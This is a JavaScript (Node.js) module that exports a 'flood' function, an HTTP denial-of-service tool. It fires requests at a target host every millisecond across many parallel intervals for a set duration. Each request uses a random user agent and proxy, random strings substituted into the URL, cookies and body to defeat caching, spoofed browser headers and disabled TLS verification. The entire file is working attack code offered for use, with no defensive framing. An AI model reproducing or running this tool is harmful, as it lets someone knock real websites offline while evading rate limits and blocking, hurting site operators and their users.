const { request } = require('undici');
const HttpProxyAgent = require('http-proxy-agent');

function randomString(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function replaceRand(str) {
  if (!str) return str;
  let result = str;
  while (result.includes('%RAND%')) {
    const randStr = randomString(Math.floor(Math.random() * 8) + 8);
    result = result.replace('%RAND%', randStr);
  }
  return result;
}

async function flood(host, duration, rates, userAgents, cookies = '', headersbro = {}, proxies = null, method = 'GET', postData = '') {
  const headersall = headersbro || {};
  const endTime = Date.now() + duration * 1000;

  function pickRandom(arrOrStr) {
    if (Array.isArray(arrOrStr)) {
      return arrOrStr[Math.floor(Math.random() * arrOrStr.length)];
    }
    return arrOrStr;
  }

  async function sendRequest() {
    try {
      // Pilih user-agent dan proxy (support string/array)
      const userAgent = pickRandom(userAgents);
      const proxy = proxies ? pickRandom(proxies) : undefined;
      const agent = proxy ? new HttpProxyAgent(proxy) : undefined;

      // Randomisasi %RAND% pada host, postData, cookies
      const targetHost = replaceRand(host);
      const targetPostData = replaceRand(postData);
      const targetCookies = replaceRand(cookies);

      const reqOptions = {
        method: method,
        headers: {
          'User-Agent': userAgent,
          'accept': headersall['accept'] || '*/*',
          'accept-language': headersall['accept-language'] || 'en-US,en;q=0.9',
          'accept-encoding': headersall['accept-encoding'] || 'gzip, deflate, br',
          'cache-control': 'no-cache, no-store, private, max-age=0, must-revalidate',
          'upgrade-insecure-requests': '1',
          'sec-fetch-dest': headersall['sec-fetch-dest'] || 'document',
          'sec-fetch-mode': headersall['sec-fetch-mode'] || 'navigate',
          'sec-fetch-site': headersall['sec-fetch-site'] || 'none',
          'te': headersall['trailers'] || 'trailers',
          'x-requested-with': 'XMLHttpRequest',
          'pragma': 'no-cache',
          'Cookie': targetCookies,
        },
        dispatcher: agent,
        alpnProtocols: ['h2'],
        connect: {
          rejectUnauthorized: false,
          timeout: 5000,
        },
        keepAliveTimeout: 60000,
        keepAliveMaxTimeout: 60000,
        keepAlive: true,
      };
      if (method === 'POST') {
        reqOptions.headers['content-type'] = 'application/x-www-form-urlencoded';
        reqOptions.body = targetPostData;
      }
      await request(targetHost, reqOptions);
    } catch (error) {
      // Optional: log error
      // console.log(error);
    }
  }

  for (let i = 0; i < rates; i++) {
    const intervalId = setInterval(() => {
      if (Date.now() >= endTime) {
        clearInterval(intervalId);
      } else {
        sendRequest();
      }
    }, 1);
  }

  console.log(`[INFO] Flood started on ${rates} rates for ${duration} seconds`);
}

module.exports = flood;
